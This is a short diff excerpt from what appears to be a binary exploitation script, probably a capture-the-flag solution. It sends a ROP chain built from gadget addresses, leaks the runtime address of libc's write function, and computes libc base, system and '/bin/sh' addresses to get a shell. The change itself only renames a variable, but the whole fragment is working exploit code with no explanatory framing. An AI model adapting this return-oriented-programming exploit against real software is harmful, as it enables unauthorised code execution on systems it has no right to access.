@@ -32,8 +32,8 @@ p += p64(0x400a70)    # mov rdx,r13...call [r12+rbx*8]
 p += p64(0x400882)*64 # main
 
 r.sendline(p)
-strlen = u64(r.recvn(9)[1:])
-libc_base = strlen - WRITE_OFF
+write = u64(r.recvn(9)[1:])
+libc_base = write - WRITE_OFF
 system = libc_base + SYSTEM_OFF
 binsh = libc_base + BIN_SH_OFF
 
